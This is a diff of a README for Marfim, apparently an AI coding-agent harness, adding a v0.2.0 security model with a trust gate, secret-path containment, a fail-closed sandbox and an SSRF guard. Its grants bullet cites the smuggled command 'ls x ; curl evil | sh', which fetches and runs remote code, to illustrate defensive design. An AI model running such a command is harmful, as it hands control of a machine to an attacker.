@@ -6,7 +6,7 @@ after a forensic analysis of ten state-of-the-art agent codebases, adopting the 
 scratch (see [docs/CLEAN-ROOM.md](docs/CLEAN-ROOM.md) and [docs/forensic/](docs/forensic/)).
 
 ```
-◆ Marfim v0.1.0 — one harness, every discipline
+◆ Marfim v0.2.0 — one harness, every discipline
 Type /help for commands · Ctrl-C interrupts · Ctrl-D exits
 ```
 
@@ -17,9 +17,9 @@ Type /help for commands · Ctrl-C interrupts · Ctrl-D exits
 | **opencode v2** | models.dev catalog with offline cache; free-model surfacing; layered config; session fork/export; usage + cost accounting; provider/model ids `provider/model` |
 | **Codex CLI** | `apply_patch` DSL; execpolicy deny rules; sandbox backends (bubblewrap/seatbelt); honest headless exit codes; AGENTS.md walk; JSONL date-sharded rollouts; profiles-ready config |
 | **Goose** | "undecidable → ask" permission fallback; explicit read-only tool tier; tool output boundedness |
-| **Aider** | fuzzy search/replace match ladder (exact → rstrip → outdent → ellipsis → nearest); reflection cap; guarded `/undo` (only Marfim-made commits); repo map; weak-model routing slots |
+| **Aider** | fuzzy search/replace match ladder (exact → rstrip → outdent → ellipsis — near-misses are hints, never applied); reflection cap; guarded `/undo` (only Marfim-authored commits); repo map; weak-model routing slots |
 | **Claude Code** | permission rule syntax `Tool(pattern)` with allow/ask/deny; permission modes (default/plan/accept-edits/bypass); hooks (PreToolUse/PostToolUse/…) with exit-2 veto; file checkpoints + `/rewind`; headless `stream-json`; CLAUDE.md memory compatibility |
-| **Hermes Agent** | prompt-cache discipline (byte-stable system prompt sections); `/doctor`; honest security model ("the sandbox is not a security boundary"); usage ledger per session |
+| **Hermes Agent** | prompt-cache discipline (stable system prompt + cache_control breakpoints; volatile env in the first user message); `/doctor`; honest security model ("the sandbox is not a security boundary"); usage ledger per session |
 | **Oh My Pi** | model roles (plan/commit/task/smol); steering queue delivered at safe step boundaries; cross-harness dir compatibility (.claude/, .codex/, AGENTS.md); skills progressive disclosure |
 | **dsh-superagent** | durable session records (store-first persistence); explicit `is_error` channel on every tool result; anti-injection posture in the system prompt (untrusted content is data) |
 | **REA** | summary-first bounded tool results with explicit `[truncated]` markers; evidence-first editing (read before edit) |
@@ -82,30 +82,59 @@ mode = "bubblewrap"          # or "seatbelt" on macOS, "none" to disable
   usage accounting), 20 presets incl. local (Ollama/LM Studio/vLLM), live models.dev
   catalog (235 providers / 8,935 models) with 24h cache and offline fallback, free-model
   onboarding, custom `base_url` providers, mock provider for tests/CI.
-- **Agent loop** — streaming turns, tool dispatch, exponential-backoff retries (auth errors
-  never retried), reflection-capped failures, auto-compaction (threshold-of-window with
-  verbatim tail) + manual `/compact`, mid-turn steering, subagents (build/plan/explore/review)
-  with depth limits and optional git-worktree isolation.
-- **Tools** — read, write, edit (fuzzy ladder + GateGuard), glob, grep (ripgrep), bash
-  (timeouts, background jobs, sandbox wrap, execpolicy), patch (apply_patch DSL), todo,
-  repomap, webfetch, websearch, skill, task, + every tool from your MCP servers
-  (`mcp__server__tool`).
-- **Permissions** — modes, ordered deny→protect→allow→ask rules, session "always" grants,
-  plan-mode read-only enforcement, config-protection, ECC-style protected files.
+- **Agent loop** — streaming turns, tool dispatch with schema validation, exponential-backoff
+  retries (auth errors never retried), reflection-capped failures, auto-compaction on turn
+  boundaries (failed compaction keeps history), REAL mid-turn steering (turns run in a worker
+  thread; Ctrl-C interrupts instead of exiting), parallel subagents in a bounded thread pool,
+  verify-driven reflection loop (`[verify] commands`), external agent backends.
+- **Model router** — `model_roles` resolve to ORDERED provider/model candidates with
+  429/5xx failover, per-role dollar budgets, and provider-neutral capabilities (tools are
+  never sent to a model that cannot take them); `/usage` priced from the cached catalog.
+- **Tools** — read, write, edit, multi_edit (exact-match ladder + GateGuard + stale-read
+  rejection + encoding/newline round-trip + atomic writes), glob, grep (ripgrep, injection-safe),
+  bash (timeouts, capped background jobs, sandbox wrap, execpolicy), patch (apply_patch DSL),
+  todo, repomap, webfetch (SSRF-guarded), websearch, skill, task, verify, + every tool from
+  your MCP servers (`mcp__server__tool`, stdio AND streamable-HTTP transports).
+- **Permissions** — modes, ordered hard-containment→deny→protect→role→bypass→allow→ask rules;
+  exact-command "always" grants (segment-aware for compound commands); plan-mode bash checked
+  by a real shell lexer with per-command flag allowlists; path containment (secret-like paths
+  denied everywhere, writes confined to the workspace); project-config trust gate.
 - **Memory & skills** — MARFIM.md/AGENTS.md/CLAUDE.md hierarchy (root→cwd walk), SKILL.md
   progressive disclosure, custom `!commands` from markdown with `$ARGUMENTS`.
-- **Sessions** — JSONL date-sharded rollouts, resume/fork/export/rm, checkpoints with
-  `/rewind`, usage + estimated cost per session.
+- **Sessions** — JSONL date-sharded rollouts (0600), resume/fork/export/rm — compaction and
+  /clear survive resume — checkpoints with `/rewind` (restores edits AND deletes files the
+  agent created), usage + estimated cost per session.
 - **UX** — REPL with streaming output, markdown-lite rendering, ~24 slash commands,
   headless mode with `text|json|stream-json`, `marfim doctor`, `marfim map`.
 
-## Testing
+## Security model (v0.2.0 — the safety wave)
 
-```bash
-python3 -m unittest discover -s tests     # 44 tests: config, permissions, tools,
-                                          # patch DSL, agent loop (mock provider),
-                                          # MCP JSON-RPC, wire protocols (canned SSE)
-```
+A 34-finding forensic review was executed end-to-end; every finding has a regression test.
+
+- **Trust gate** — a repo's `.marfim/config.toml` is untrusted until you run
+  `marfim trust add` (review the file; sha256 keyed in `~/.marfim/trust.json`). Until then only
+  its deny/ask rules apply: a hostile repo cannot set bypass mode, plant hooks, redirect
+  providers (API-key exfiltration), or add MCP servers.
+- **Containment** — secret-like paths (`.ssh`, `.env`, `.aws`, `.git/config`, the Marfim home,
+  the session dir) are denied in EVERY mode; writes must stay inside the project root +
+  `writable_dirs`; `.git/hooks`/`.marfim` are re-mounted read-only inside the sandbox.
+- **Deny rules beat bypass** — `bypass` approves tool CALLS, not deny rules or config protection.
+- **Sandbox fails closed** — a requested-but-missing backend aborts the command
+  (`sandbox_required = false` is the explicit opt-out); bash/MCP/hook children get a scrubbed
+  environment (no API keys).
+- **Grants are exact** — approving `ls -la` never authorizes `ls x ; curl evil | sh`, and
+  interpreters/shells/sudo/curl/git are never auto-granted.
+- **Hooks fail closed** — a PreToolUse hook that times out DENIES the call.
+- **SSRF guard** — webfetch resolves every hop and refuses private/loopback/link-local/
+  metadata ranges (169.254.169.254 included).
+
+### Honest exit codes (headless)
+
+| code | meaning |
+|---|---|
+| 0 | completed |
+| 1 | provider error, max turns, interrupt, or compaction failure |
+| 2 | a permission denial blocked the task (or the config is invalid) |
 
 ## Repository layout
 
@@ -115,7 +144,7 @@ marfim/                  the harness (Python, stdlib-only core)
   agent/                 loop, prompts, compaction
   tools/                 13 built-in tools + MCP bridge
   ui/                    REPL, slash commands, headless
-  mcp/                   MCP stdio client (JSON-RPC)
+  mcp/                   MCP client (JSON-RPC over stdio + streamable-HTTP)
   session/               JSONL session store + checkpoints
 docs/
   forensic/              11 forensic dossiers of the analyzed codebases (3,084 lines)
@@ -124,7 +153,7 @@ docs/
   ROADMAP.md             what comes next (LSP/DAP, CodeMode, mandates, ...)
   CLEAN-ROOM.md          methodology + legal notice
 examples/                config.toml, skill, custom command, hook script
-tests/                   44 unittest cases
+tests/                   115+ unittest cases incl. pty REPL and MCP protocol suites
 ```
 
 ## License
